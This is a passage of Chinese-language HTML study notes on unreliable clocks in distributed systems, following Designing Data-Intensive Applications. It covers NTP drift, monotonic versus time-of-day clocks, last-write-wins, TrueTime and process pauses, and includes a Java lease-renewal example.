<li>例 5-8 描述了 &nbsp;<strong>时间点</strong>（point in time），事件发生的在特定日期和时间</li>
</ul>
<p>在分布式系统中，时间是一件棘手的事情，因为通信不是即时的：消息通过网络从一台机器传送到另一台机器需要时间。收到消息的时间总是晚于发送的时间，但是由于网络中的可变延迟，我们不知道晚了多少时间。这个事实导致有时很难确定在涉及多台机器时发生事情的顺序。</p>
<p>而且，<mark style="background: #FFF3A3A6;">网络上的每台机器都有自己的时钟</mark>，这是一个实际的硬件设备：通常是石英晶体振荡器。这些设备不是完全准确的，可能比其他机器稍快或更慢。可以在一定程度上同步时钟：最常用的机制是 &nbsp;<strong><mark style="background: #BBFABBA6;">网络时间协议</mark>（Network Time Protocol，NTP）</strong>，它允许根据<mark style="background: #FFF3A3A6;">一组服务器</mark>报告的时间来调整计算机时钟。服务器则从更精确的时间源（如 GPS 接收器）获取时间。</p>
<h3 id="单调钟与日历时钟">单调钟与日历时钟</h3>
<p>现代计算机至少有两种不同的时钟：</p>
<ul>
<li>日历时钟（time-of-day clock）：适用于时间点</li>
<li>单调钟（monotonic clock）：适用于时间间隔</li>
</ul>
<h4 id="日历时钟">日历时钟</h4>
<p>日历时钟：根据某个日历（也称为 &nbsp;<strong>挂钟时间</strong>，即 wall-clock time）返回当前日期和时间</p>
<ul>
<li>例如，Linux 上的 &nbsp;<code>clock_gettime(CLOCK_REALTIME)</code> 和 Java 中的 &nbsp;<code>System.currentTimeMillis()</code>&nbsp; 返回自 epoch（UTC 时间 1970 年 1 月 1 日午夜）以来的秒数（或毫秒），根据公历（Gregorian）日历，不包括闰秒。有些系统使用其他日期作为参考点。</li>
</ul>
<p>日历时钟通常与 NTP 同步，这意味着<mark style="background: #BBFABBA6;">理想情况下，来自一台机器的时间戳与另一台机器上的时间戳相同</mark>。但是实践中会有很多问题。特别是，如果本地时钟在 NTP 服务器之前太远，则它可能会被强制重置，看上去好像跳回了先前的时间点。这些跳跃以及日历时钟经常忽略闰秒的事实，使<mark style="background: #FFF3A3A6;">日历时钟不能用于测量经过时间（</mark>elapsed time）。</p>
<h4 id="单调时钟">单调时钟</h4>
<p><mark style="background: #BBFABBA6;">单调钟适用于测量持续时间（时间间隔）</mark></p>
<ul>
<li>例如超时或服务的响应时间：Linux 上的 &nbsp;<code>clock_gettime(CLOCK_MONOTONIC)</code>，和 Java 中的 &nbsp;<code>System.nanoTime()</code>&nbsp; 都是单调时钟</li>
<li>这个名字来源于他们保证总是往前走（而日历时钟可以往回跳）</li>
</ul>
<p>单调时钟下，两个读取的差值衡量了中间经过了多长时间，但单次读取的绝对值无任何意义。它可能是计算机启动以来的纳秒数，或类似的任意值。特别是<mark style="background: #FFF3A3A6;">比较来自两台不同计算机的单调钟的值是没有意义的</mark>，因为它们并不是一回事。</p>
<p>在具有多个 CPU 的服务器上，每个 CPU 可能有一个单独的计时器，但不一定与其他 CPU 同步。操作系统会补偿所有的差异，并尝试向应用线程表现出单调钟的样子，即使这些线程被调度到不同的 CPU 上。当然，明智的做法是不要太把这种单调性保证当回事。</p>
<p>如果 NTP 协议检测到计算机的本地石英钟比 NTP 服务器要更快或更慢，则可以调整单调钟向前走的频率（这称为 &nbsp;<strong>偏移（skewing）</strong>&nbsp; 时钟）。默认情况下，NTP 允许<mark style="background: #FFF3A3A6;">时钟速率</mark>增加或减慢最高至 0.05%，但 <mark style="background: #BBFABBA6;">NTP 不能使单调时钟向前或向后跳转</mark>。单调时钟的分辨率通常相当好：在大多数系统中，它们能在几微秒或更短的时间内测量时间间隔。</p>
<p>在分布式系统中，使用单调钟测量 &nbsp;<strong>经过时间</strong>（elapsed time，比如超时）通常很合适，因为它不假定不同节点的时钟之间存在任何同步，并且对测量的轻微不准确性不敏感。</p>
<h3 id="时钟同步与准确性">时钟同步与准确性</h3>
<p>单调时钟不需要同步，但是日历时钟需要根据 NTP 服务器或其他外部时间源来设置才能有用，否则误差可能越来越大。不幸的是，我们获取时钟的方法并不像你所希望的那样可靠或准确 —— 硬件时钟和 NTP 可能会变幻莫测。举几个例子：</p>
<ul>
<li>计算机中的石英钟不够精确：它会 &nbsp;<strong>漂移</strong>（drifts，即运行速度快于或慢于预期）。时钟漂移取决于机器的温度。 Google 假设其服务器时钟漂移为 200 ppm（百万分之一），相当于每 30 秒与服务器重新同步一次的时钟漂移为 6 毫秒，或者每天重新同步的时钟漂移为 17 秒。即使一切工作正常，此漂移也会限制可以达到的最佳准确度。</li>
<li>如果计算机的时钟与 NTP 服务器的时钟差别太大，可能会拒绝同步，或者本地时钟将被强制重置。任何观察重置前后时间的应用程序都可能会看到<mark style="background: #FF5582A6;">时间倒退或突然跳跃</mark>。</li>
<li>如果某个节点被 NTP 服务器的防火墙意外阻塞，有可能会持续一段时间都没有人会注意到。</li>
<li><mark style="background: #FFF3A3A6;">NTP 同步受限于网络延迟</mark>，在延迟可变的拥塞网络上时，NTP 同步的准确性会受到限制。一个实验表明，当通过互联网同步时，35ms 的最小误差是可以实现的，尽管偶尔的网络延迟峰值会导致大约一秒的误差。根据配置，较大的网络延迟会导致 NTP 客户端完全放弃。</li>
<li>一些 NTP 服务器是错误的或者配置错误的，报告的时间可能相差几个小时。因此 NTP 客户端设计的非常健壮，会<mark style="background: #BBFABBA6;">查询多个服务器并忽略异常值</mark>。无论如何，依赖于互联网上的陌生人所告诉你的时间来保证你的系统的正确性，这还挺让人担忧的。</li>
<li>闰秒导致一分钟可能有 59 秒或 61 秒，这会打破一些在设计之时未考虑闰秒的系统的时序假设。闰秒已经使许多大型系统崩溃的事实说明了，关于时钟的错误假设是多么容易偷偷溜入系统中。处理闰秒的最佳方法可能是让 NTP 服务器 “撒谎”，并在一天中逐渐执行闰秒调整（这被称为 &nbsp;<strong>拖尾</strong>，即 smearing），虽然实际的 NTP 服务器表现各异。</li>
<li>在<mark style="background: #FFF3A3A6;">虚拟机中</mark>，硬件时钟被虚拟化，这对于需要精确计时的应用程序提出了额外的挑战。当一个 CPU 核心在虚拟机之间共享时，每个虚拟机都会暂停几十毫秒，与此同时另一个虚拟机正在运行。从应用程序的角度来看，这种<mark style="background: #FFF3A3A6;">停顿表现为时钟突然向前跳跃</mark>。</li>
<li>如果你在<mark style="background: #FFF3A3A6;">没有完整控制权的设备</mark>（例如，移动设备或嵌入式设备）上运行软件，则<mark style="background: #FFF3A3A6;">可能完全不能信任该设备的硬件时钟</mark>。一些用户故意将其硬件时钟设置为不正确的日期和时间，例如，为了规避游戏中的时间限制，时钟可能会被设置到很远的过去或将来。</li>
</ul>
<p>虽然有这些问题，但如果不计代价，也可以实现非常好的时钟精度。例如，针对金融机构的欧洲法规草案 MiFID II 要求所有高频率交易基金在 UTC 时间 100 微秒内同步时钟，以便调试 “闪崩” 等市场异常现象，并帮助检测市场操纵。</p>
<ul>
<li>通过 GPS 接收机，精确时间协议（Precision Time Protocol，PTP）以及仔细的部署和监测可以实现这种精确度。</li>
<li>然而，这需要很多努力和专业知识，而且有很多东西都会导致时钟同步错误。如果 NTP 守护进程配置错误，或者防火墙阻止了 NTP 通信，由漂移引起的时钟误差可能很快就会变大。</li>
</ul>
<h3 id="依赖同步时钟">依赖同步时钟</h3>
<p>时钟虽然看起来简单易用，但有出乎意料的问题：</p>
<ul>
<li><p>一天可能不会有精确的 86,400 秒</p></li>
<li><p><strong>日历时钟</strong>&nbsp; 可能会前后跳跃</p></li>
<li><p>而一个节点上的时间可能与另一个节点上的时间完全不同。</p></li>
<li><p>尽管大部分时候，时钟都工作得很好，但仍需要准备健壮的软件来处理不正确的时钟。这与网络类似：</p></li>
<li><p>尽管网络在大多数情况下表现良好，但软件的设计必须假定网络偶尔会出现故障，而软件必须正常处理这些故障。时钟也是如此：</p></li>
</ul>
<p><mark style="background: #FFF3A3A6;">时钟问题造成的影响往往不易被发现</mark></p>
<ul>
<li>如果 CPU、内存或者网络故障，系统可能会立即出现很严重的问题，很快就会被注意和修复</li>
<li>如果时钟同步出现问题，系统看起来可能仍然可以正常运转，即使时钟偏差越来越大。如果某个软件依赖于精确同步的时钟，那么结果更可能是悄无声息的，仅有微量的数据丢失，而不是一次惊天动地的崩溃。</li>
</ul>
<p>因此，如果你使用需要同步时钟的软件，必须<mark style="background: #BBFABBA6;">仔细监控所有机器之间的时钟偏移</mark>。时钟偏离其他时钟太远的节点应当被宣告死亡，并从集群中移除。这样的监控可以确保你在损失发生之前注意到破损的时钟。</p>
<h4 id="有序事件的时间戳">有序事件的时间戳</h4>
<p>考虑一种危险的依赖时钟的情况：<strong>使用节点的本地时钟来给跨节点的事件定序</strong>。 例如，如果两个客户端写入分布式数据库，谁先到达？ 哪个是最新的更新？</p>
<p>图 8-3 展示了在多主复制的数据库中对时钟的危险使用：</p>
<ul>
<li>客户端 A 在节点 1 上写入 &nbsp;<code>x = 1</code>；写入被复制到节点 3</li>
<li> 客户端 B 在节点 3 上增加 x（现在 &nbsp;<code>x = 2</code>）</li>
<li>最后这两个写入都被复制到节点 2</li>
</ul>
<p><img src="ch08-fig03.png"> <strong> 图 8-3 客户端 B 的写入比客户端 A 的写入要晚，但是 B 的写入具有较早的时间戳。</strong></p>
<p>在 &nbsp; 图 8-3 中，当一个写入被复制到其他节点时，它会<mark style="background: #FFF3A3A6;">根据发生写入的节点上的日历时钟标记一个时间戳</mark>。在这个例子中，时钟同步是非常好的：节点 1 和节点 3 之间的偏差小于 3ms，这可能比你在实践中能预期的更好。</p>
<p>尽管如此，图 8-3 中的时间戳却无法正确排列事件：写入 &nbsp;<code>x = 1</code>&nbsp; 的时间戳为 42.004 秒，但写入 &nbsp;<code>x = 2</code>&nbsp; 的时间戳为 42.003 秒，<mark style="background: #FFF3A3A6;">即使 &nbsp;<code>x = 2</code>&nbsp; 在稍后出现</mark>。当节点 2 接收到这两个事件时，会错误地推断出 &nbsp;<code>x = 1</code>&nbsp; 是最近的值，而丢弃写入 &nbsp;<code>x = 2</code>。效果上表现为，<mark style="background: #FF5582A6;">客户端 B 的增量操作会丢失</mark>。</p>
<p>这种冲突解决策略被称为 &nbsp;<strong>最后写入胜利（LWW）</strong>，它在多主复制和无主数据库（如 Cassandra 和 Riak ）中被广泛使用。有些实现会在客户端而不是服务器上生成时间戳，但这并不能改变 LWW 的基本问题：</p>
<ul>
<li><mark style="background: #FF5582A6;">写入可能会神秘地消失</mark>：时钟滞后的节点无法覆盖之前时钟超前的节点写入的值，直到节点之间的时钟偏差消逝。此方案可能导致一定数量的数据被悄悄丢弃，而未向应用报告任何错误。</li>
<li><mark style="background: #FF5582A6;">无法区分因果关系</mark>：<mark style="background: #FFF3A3A6;">LWW 无法区分 &nbsp; 高频顺序写入</mark>（在 &nbsp; 图 8-3&nbsp; 中，客户端 B 的增量操作 &nbsp;<strong>一定</strong>&nbsp; 发生在客户端 A 的写入之后）<mark style="background: #FFF3A3A6;">和 &nbsp; 真正并发写入</mark>（写入者意识不到其他写入者）。需要<mark style="background: #BBFABBA6;">额外的因果关系跟踪机制</mark>（例如版本向量），以防止违背因果关系（请参阅 “检测并发写入”）。</li>
<li><mark style="background: #FF5582A6;">两个节点可能生成具有相同时间戳的写入</mark>，特别是在时钟仅具有毫秒分辨率的情况下。为了解决这样的冲突，还需要一个额外的 &nbsp;<strong><mark style="background: #FFF3A3A6;">决胜值</mark></strong>（tiebreaker，可以简单地是一个大随机数），但这种方法也可能会导致<mark style="background: #FF5582A6;">违背因果关系</mark>。</li>
</ul>
<p>因此，尽管通过保留最 “最近” 的值并放弃其他值来解决冲突是很诱惑人的，但是要注意，<mark style="background: #FFF3A3A6;">“最近” 的定义取决于本地的 &nbsp;<strong>日历时钟</strong>，这很可能是不正确的</mark>。即使用严格同步的 NTP 时钟，一个数据包也可能在时间戳 100 毫秒（发送者的时钟）时发送，并在时间戳 99 毫秒（接收者的时钟）处到达 —— 看起来好像数据包在发送之前已经到达，这是不可能的。</p>
<p>NTP 同步是否能足够准确，避免这种不正确的排序发生？不能。因为 NTP 本身就是通过网络进行同步的，其精度则必受限于同步两侧的往返延迟，更遑论叠加其他误差，比如石英钟的漂移（quartz drift）。换句话说，为了处理网络误差以正确定序，我们需要使用<strong>更精确</strong>的手段，而非网络本身（NTP）。</p>
<p>逻辑时钟 vs 物理时钟：</p>
<ul>
<li><strong>逻辑时钟（logic clock）</strong> ：<mark style="background: #BBFABBA6;">基于递增计数器</mark>而不是振荡石英晶体，对于排序事件来说是更安全的选择（请参阅 “检测并发写入”）。逻辑时钟不测量一天中的时间或经过的秒数，而<mark style="background: #FFF3A3A6;">仅测量事件的相对顺序（无论一个事件发生在另一个事件之前还是之后）</mark>。</li>
<li>物理时钟（physical clock）：<strong>日历时钟</strong>&nbsp; 和 &nbsp;<strong>单调钟</strong>&nbsp;，用来测量实际经过时间</li>
<li>我们将在 “顺序保证” 中来看顺序问题。</li>
</ul>
<h4 id="时钟读数的置信区间">时钟读数的置信区间</h4>
<p>尽管你可以从机器上读取以微秒（microsecond）甚至纳秒（nanosecond）为单位的日历时间戳（time-of-day），但这并不意味你可以得到具有这样精度的绝对时间。如前所述，误差来自于几方面：</p>
<ol type="1">
<li><strong>石英晶振漂移</strong>。如果你直接从本地石英钟读取时间戳，其偏移很容易就可以累积数毫秒。</li>
<li><strong>NTP 同步误差</strong>。如果你想定时通过 NTP 来同步，比如每分钟同步一次。但 NTP 协议是走网络的，而网络通信最快做到毫秒级延迟，偶有拥塞，延迟便能冲到数百毫秒。</li>
</ol>
<p>总结来说，<mark style="background: #FFF3A3A6;">使用普通硬件，你无论如何都难以得到真正 “准确” 的时间戳</mark>。</p>
<p>因此，将时钟的读数视为一个时间点意义不大，准确来说，其读数应该是一个<mark style="background: #BBFABBA6;">具有置信区间的时间范围</mark>。比如，一个系统有 95% 的信心保证当前时刻落在该分钟过 10.3 到 10.5 秒，但除此以外，不能提供任何一进步的保证。在 +/– 100 ms 的置信区间内，时间戳的微秒零头毫无意义。</p>
<p>时钟的误差区间可以通过你的<strong>时钟源</strong>进行计算：</p>
<ol type="1">
<li><strong>高精度硬件</strong>。如果你的机器使用了 GPS 接收器或者铯原子钟，则硬件制造商会提供误差范围。</li>
<li><strong>其他服务器</strong>。如果你通过 NTP 服务从其他服务器获取时间。则误差区间是几种因素叠加：该 NTP 服务器的误差范围、服务器间的往返延迟、同步后石英晶振漂移等等。</li>
</ol>
<p>但不幸，大多数服务器的时钟系统 API 在给出时间点时，并不会一并给出对应的不确定区间。例如，你使用 &nbsp;<code>clock_gettime()</code>&nbsp; 系统调用获取时间戳时，返回值并不包括其置信区间，因此你无法知道这个时间点的误差是 5 毫秒还是 5 年。</p>
<p>一个有趣的反例是谷歌在 Spanner 系统中使用的 &nbsp;<em>TrueTime</em>&nbsp;API，会<mark style="background: #FFF3A3A6;">显式的给出置信区间</mark>。当你向 TrueTime 系统询问当前时钟时，会得到两个值，或者说一个区间：<code>[earliest, latest]</code>，前者是最早可能的时间戳。后者是最迟可能的时间错。通过该不确定预估，我们可以确定<mark style="background: #FFF3A3A6;">准确时间点就在该时钟范围内</mark>。此时，区间的大小取决于，上一次同步过后本地石英钟的漂移多少。</p>
<h4 id="用于快照的时钟同步">用于快照的时钟同步</h4>
<p>快照隔离的实现通常需要一个<mark style="background: #BBFABBA6;">全局自增的事务 ID</mark>。如果一个写入发生在快照 S 之后，则基于快照 S 的事务看不到该写入的内容。对于单机数据库，简单的使用一个<strong>全局自增计数器</strong>，就能够充当事务 ID 的来源。</p>
<p>然而，当数据库横跨多个机器，甚至多个数据库中心时，一个可用于事务全局自增 ID 并不容易实现，因为需要进行<strong>多机协作</strong>。<mark style="background: #FFF3A3A6;">事务 ID 必须要反应因果性</mark>：如当事务 B 读到事务 A 写的内容时，事务 B 的事务 ID 就需要比事务 A 大。非如此，快照不能维持一致。另外，如果系统中存在大量短小事务，分配事务 ID 可能会成为分布式系统中的一个瓶颈。</p>
<ul>
<li>这其实就是分布式事务中常说的 &nbsp;<strong>TSO 方案</strong>（Timestamp Oracle，统一中心授时），这种方案通常会有性能瓶颈；尤其在跨数据中心的数据库里，会延迟很高，实践中也有很多优化方案。</li>
<li>存在分布式 ID 生成器，例如 Twitter 的雪花算法（Snowflake），其以可伸缩的方式（例如，通过将 ID 空间的块分配给不同节点）近似单调地增加唯一 ID。但是，它们<mark style="background: #FFF3A3A6;">通常无法保证与因果关系一致的排序</mark>，因为分配的 ID 块的时间范围比数据库读取和写入的时间范围要长。另请参阅 “第九章的顺序保证”。</li>
</ul>
<p>由于时钟同步的不确定性，简单使用机器的日历时钟的时间戳作为事务 ID 是不太靠谱的。</p>
<p>但 Spanner 就使用了物理时钟实现了快照隔离：</p>
<ul>
<li>使用 TrueTime 的 API 时，让其返回一个<strong>置信区间</strong>，而非一个时间点，来代表一个<strong>时间戳</strong>。</li>
<li>对于两个时间戳 A 和 B（<em>A</em>&nbsp;= [Aearliest,&nbsp;Alatest]，<em>B</em>&nbsp;= [Bearliest,&nbsp;Blatest]）
<ul>
<li>如果这两个时间戳对应的<mark style="background: #FFF3A3A6;">区间没有交集</mark>（例如，<em>Aearliest</em>&nbsp;&lt;&nbsp;<em>Alatest</em>&nbsp;&lt;&nbsp;<em>Bearliest</em>&nbsp;&lt;&nbsp;<em>Blatest</em>），则可以确信时间戳 B 发生于 A 之后</li>
<li>但如果两个区间有交集，则不能确定 A 和 B 的相对顺序。</li>
</ul></li>
<li>为了保证这种时间戳能够用作事务 ID，相邻生成的两个时间戳<mark style="background: #FFF3A3A6;">最好要间隔一个置信区间，以保证其没有交集</mark>。为此，Spanner 在索要时间戳时（比如提交事务），<mark style="background: #FFF3A3A6;">会等待一个置信区间</mark>。因此置信区间越小，这种方案的性能也就越好。
<ul>
<li>为此，谷歌在每个数据中心使用了专门的硬件做为时钟源，比如原子钟和 GPS 接收器，以保证时钟的置信区间不超过 7 ms。</li>
</ul></li>
</ul>
<h4 id="进程暂停">进程暂停</h4>
<p>让我们考虑在分布式系统中使用危险时钟的另一个例子。假设你有一个数据库，每个分区只有一个领导者。只有领导被允许接受写入。一个节点如何知道它仍然是领导者（它并没有被别人宣告为死亡），并且它可以安全地接受写入？</p>
<p>一种选择是领导者从其他节点获得一个 &nbsp;<strong>租约（lease）</strong>，类似一个带超时的锁。<mark style="background: #FFF3A3A6;">任一时刻只有一个节点可以持有租约</mark> —— 因此，当一个节点获得一个租约时，它知道它在某段时间内自己是领导者，直到租约到期。为了保持领导地位，节点必须周期性地在租约过期前续期。</p>
<p>如果节点发生故障，就会停止续期，所以当租约过期时，另一个节点可以接管。</p>
<p>可以想象，请求处理循环看起来像这样：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) {</span><br><span class="line">  request = getIncomingRequest();</span><br><span class="line">  <span class="comment">// 确保租约还剩下至少 10 秒</span></span><br><span class="line">  <span class="keyword">if</span> (lease.expiryTimeMillis - System.currentTimeMillis() &lt; <span class="number">10000</span>){</span><br><span class="line">    lease = lease.renew();</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lease.isValid()) {</span><br><span class="line">    process(request);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这个代码有什么问题？</p>
<ul>
<li><mark style="background: #FF5582A6;">依赖于同步时钟</mark>：租约到期时间由另一台机器设置（例如，当前时间加上 30 秒，计算到期时间），并将其与本地系统时钟进行比较。如果时钟不同步超过几秒，这段代码将开始做奇怪的事情。</li>
<li><mark style="background: #FFF3A3A6;">假设执行很快</mark>：代码假定在执行剩余时间检查 &nbsp;<code>System.currentTimeMillis()</code>&nbsp; 和实际执行请求 &nbsp;<code>process(request)</code>&nbsp; 中间的时间间隔非常短。
<ul>
<li>通常情况下，这段代码运行得非常快，所以 10 秒的缓冲区已经足够确保 &nbsp;<strong>租约</strong>&nbsp; 在请求处理到一半时不会过期。</li>
</ul></li>
</ul>
<p>但是，如果<mark style="background: #FFF3A3A6;">程序执行中出现了意外的停顿</mark>呢？例如，想象一下，线程在 &nbsp;<code>lease.isValid()</code>&nbsp; 行周围停止 15 秒，然后才继续。在这种情况下，在请求被处理的时候，租约可能已经过期，而另一个节点已经接管了领导。然而，没有什么可以告诉这个线程已经暂停了这么长时间了，所以这段代码不会注意到租约已经到期了，直到循环的下一个迭代 —— 到那个时候它可能已经做了一些不安全的处理请求。</p>
<p>假设一个线程可能会暂停很长时间，这是疯了吗？不幸的是，这种情况发生的原因有很多种：</p>
<ul>
<li>许多编程语言运行时（如 Java 虚拟机）都有一个<mark style="background: #FFF3A3A6;">垃圾收集器</mark>（GC），偶尔需要停止所有正在运行的线程。这些 “<strong><mark style="background: #FFF3A3A6;">停止所有处理（stop-the-world）</mark></strong>”GC 暂停有时会持续几分钟！甚至像 HotSpot JVM 的 CMS 这样的所谓的 “并行” 垃圾收集器也不能完全与应用程序代码并行运行，它需要不时地停止所有处理。尽管通常可以通过改变分配模式或调整 GC 设置来减少暂停，但是如果我们想要提供健壮的保证，就必须假设最坏的情况发生。</li>
<li>在<mark style="background: #FFF3A3A6;">虚拟化环境</mark>中，可以 &nbsp;<mark style="background: #FFF3A3A6;">挂起（suspend）虚拟机</mark>（暂停执行所有进程并将内存内容保存到磁盘）并恢复（恢复内存内容并继续执行）。这个暂停可以在进程执行的任何时候发生，并且可以持续任意长的时间。这个功能有时用于虚拟机从一个主机到另一个主机的实时迁移，而不需要重新启动，在这种情况下，暂停的长度取决于进程写入内存的速率。</li>
<li>在用户的终端设备（如笔记本电脑）上，执行也可能被暂停并随意恢复，例如当用户关闭笔记本电脑的盖子时。</li>
<li>当<mark style="background: #FFF3A3A6;">操作系统上下文切换</mark>到另一个线程时，或者当管理程序切换到另一个虚拟机时（在虚拟机中运行时），当前正在运行的线程可能在代码中的任意点处暂停。在虚拟机的情况下，在其他虚拟机中花费的 CPU 时间被称为 &nbsp;<strong>窃取时间（steal time）</strong>。如果机器处于重负载下（即，如果等待运行的线程队列很长），暂停的线程再次运行可能需要一些时间。</li>
<li>如果应用程序执行<mark style="background: #FFF3A3A6;">同步磁盘访问</mark>，则线程可能暂停，等待缓慢的磁盘 I/O 操作完成。在许多语言中，即使代码没有包含文件访问，磁盘访问也可能出乎意料地发生 —— 例如，Java 类加载器在第一次使用时惰性加载类文件，这可能在程序执行过程中随时发生。 I/O 暂停和 GC 暂停甚至可能合谋组合它们的延迟。如果磁盘实际上是一个网络文件系统或网络块设备（如亚马逊的 EBS），I/O 延迟进一步受到<mark style="background: #FFF3A3A6;">网络延迟</mark>变化的影响。</li>
<li>如果操作系统允许磁盘交换区（swapping to disk），则简单的内存访问可能导致 &nbsp;<strong>页面错误（page fault）</strong>，要求将磁盘中的页面装入内存。当这个缓慢的 I/O 操作发生时，线程暂停。如果内存压力很高，则可能需要将另一个页面换出到磁盘。在极端情况下，操作系统可能花费大部分时间将页面交换到内存中，而实际上完成的工作很少（这被称为 &nbsp;<strong>抖动</strong>，即 thrashing）。为了避免这个问题，<mark style="background: #FFF3A3A6;">通常在服务器机器上禁用页面调度</mark>（如果你宁愿干掉一个进程来释放内存，也不愿意冒抖动风险）。</li>
<li>可以通过发送<mark style="background: #FFF3A3A6;"> SIGSTOP 信号来暂停 Unix 进程</mark>，例如通过在 shell 中按下 Ctrl-Z。 这个信号立即阻止进程继续执行更多的 CPU 周期，直到 SIGCONT 恢复为止，此时它将继续运行。 即使你的环境通常不使用 SIGSTOP，也可能由运维工程师意外发送。</li>
</ul>
<p>所有这些事件都可以随时 &nbsp;<mark style="background: #FFF3A3A6;">抢占（preempt） 正在运行的线程，并在稍后的时间恢复运行，而线程甚至不会注意到这一点</mark>。这个问题类似于在单个机器上使多线程代码线程安全：你不能对时序做任何假设，因为随时可能发生上下文切换，或者出现并行运行。</p>
<p>当在一台机器上编写多线程代码时，我们有相当好的工具来实现线程安全：互斥量，信号量，原子计数器，无锁数据结构，阻塞队列等等。不幸的是，这些工具并不能直接转化为分布式系统操作，因为<mark style="background: #FFF3A3A6;">分布式系统没有共享内存</mark>，只有通过不可靠网络发送的消息。</p>
<p>分布式系统中的节点，<mark style="background: #BBFABBA6;">必须假定其执行可能在任意时刻暂停相当长的时间</mark>，即使是在一个函数的中间。在暂停期间，世界的其它部分在继续运转，甚至可能因为该节点没有响应，而宣告暂停节点的死亡。最终暂停的节点可能会继续运行，在再次检查自己的时钟之前，甚至可能不会意识到自己进入了睡眠。</p>
<h4 id="响应时间保证">响应时间保证</h4>
<p>在许多编程语言和操作系统中，线程和进程可能暂停一段无限制的时间，正如讨论的那样。如果你足够努力，导致暂停的原因是 &nbsp;<strong>可以</strong>&nbsp; 消除的。</p>
<p>某些软件的运行环境要求很高，不能在特定时间内响应可能会导致严重的损失：控制飞机、火箭、机器人、汽车和其他物体的计算机必须对其传感器输入做出快速而可预测的响应。<mark style="background: #FFF3A3A6;">在这些系统中，软件必须有一个特定的 &nbsp; 截止时间（deadline），如果截止时间不满足，可能会导致整个系统的故障。这就是所谓的 &nbsp; 硬实时（hard real-time）系统</mark>。</p>
<blockquote>
<p>实时是真的吗？</p>
<ul>
<li>在嵌入式系统中，实时是指系统经过精心设计和测试，以满足所有情况下的特定时间保证。</li>
<li>这个含义与 Web 上对实时术语的模糊使用相反，后者描述了服务器将数据推送到客户端以及没有严格的响应时间限制的流处理。</li>
</ul>
</blockquote>
<p>例如，如果车载传感器检测到当前正在经历碰撞，你肯定不希望安全气囊释放系统因为 GC 暂停而延迟弹出。</p>
<p>在系统中提供 &nbsp;<strong>实时保证</strong>&nbsp; 需要各级软件栈的支持：</p>
<ul>
<li>一个<mark style="background: #FFF3A3A6;">实时操作系统</mark>（RTOS），允许在指定的时间间隔内保证 CPU 时间的分配
<ul>
<li>库函数必须申明最坏情况下的执行时间</li>
</ul></li>
<li>动态内存分配可能受到限制或完全不允许（实时垃圾收集器存在，但是应用程序仍然必须确保它不会给 GC 太多的负担）</li>
<li>必须进行<mark style="background: #FFF3A3A6;">大量的测试</mark>，以确保达到保证</li>
</ul>
<p>所有这些都需要大量额外的工作，严重限制了可以使用的编程语言、库和工具的范围（因为<mark style="background: #FF5582A6;">大多数语言和工具不提供实时保证</mark>）。由于这些原因，开发实时系统非常昂贵，并且它们通常用于安全关键的嵌入式设备。而且，<mark style="background: #FFF3A3A6;">“实时” 与 “高性能” 不一样 </mark>—— 事实上，实时系统可能具有较低的吞吐量，因为他们必须让及时响应的优先级高于一切。</p>
<p>对于大多数服务器端数据处理系统来说，实时保证是不经济或不合适的。因此，这些系统必须承受在非实时环境中运行的暂停和时钟不稳定性。</p>
<h4 id="限制垃圾收集的影响">限制垃圾收集的影响</h4>
<p>如何降低垃圾回收的影响：</p>
<ul>
<li>配置垃圾回收参数。
<ul>
<li>语言运行时在进行垃圾回收时具有一定的灵活性，因为它们可以跟踪对象分配的速度和随着时间的推移剩余的空闲内存。</li>
</ul></li>
<li>将 GC 暂停视为一个节点的短暂计划中断，并在这个节点收集其垃圾的同时，让其他节点处理来自客户端的请求
<ul>
<li>如果运行时可以警告应用程序一个节点很快需要 GC 暂停，那么应用程序可以停止向该节点发送新的请求，等待它完成处理未完成的请求，然后在没有请求正在进行时执行 GC。</li>
<li>这个技巧<mark style="background: #FFF3A3A6;">向客户端隐藏了 GC 暂停</mark>，并降低了响应时间的高百分比。一些对延迟敏感的金融交易系统使用这种方法。</li>
</ul></li>
<li>只用垃圾收集器来处理短时对象（这些对象可以快速收集），并定期在积累大量长寿对象（因此需要完整 GC）之前重新启动进程。
<ul>
<li>一次可以重新启动一个节点，在计划重新启动之前，流量可以从该节点移开，就像滚动升级一样。</li>
</ul></li>
</ul>
<p>这些措施不能完全阻止垃圾回收带来的暂停，但可以有效地减少它们对应用的影响。</p>
<h2 id="知识事实和谎言">知识、事实和谎言</h2>
<p>到此为止，本章已经梳理了分布式系统和单机系统的诸多差异：</p>
<ol type="1">
<li>进程间不能共享内存，只能通过<strong>消息传递</strong>来交互</li>
<li>唯一的通信渠道（网络）还是<strong>不可靠</strong>的，且有<strong>无界（unbounded）延迟</strong></li>
<li>时钟同步不可靠</li>
<li>随时可能发生的<strong>进程停顿</strong></li>
</ol>
<p>如果你不习惯于分布式系统，那么这些问题的后果就会让人迷惑不解。网络中的一个节点无法确切地知道任何事情 —— 它只能根据它通过网络接收到（或没有接收到）的消息进行猜测。节点只能通过交换消息来找出另一个节点所处的状态（存储了哪些数据，是否正确运行等等）。<mark style="background: #FFF3A3A6;">如果远程节点没有响应，则无法知道它处于什么状态</mark>，因为网络中的问题不能可靠地与节点上的问题区分开来。</p>
<p>这些系统的讨论与哲学有关：</p>
<ul>
<li>在系统中什么是真什么是假？</li>
<li>如果感知和测量的机制都是不可靠的，那么关于这些知识我们又能多么确定呢？</li>
<li>软件系统应该遵循我们对物理世界所期望的法则，如因果关系吗？</li>
</ul>
<p>在分布式系统中，我们可以陈述关于行为（系统模型）的假设，并以满足这些假设的方式设计实际系统。算法可以被证明在某个系统模型中正确运行。这意味着即使底层系统模型提供了很少的保证，也可以实现可靠的行为。</p>
<p>但是，尽管可以使软件在不可靠的系统模型中表现良好，但这并不是可以直截了当实现的。在本章的其余部分中，我们将进一步探讨分布式系统中的知识和事实的概念，这将有助于我们思考我们可以做出的各种假设以及我们可能希望提供的保证。</p>
<h3 id="事实由多数派定义">事实由多数派定义</h3>
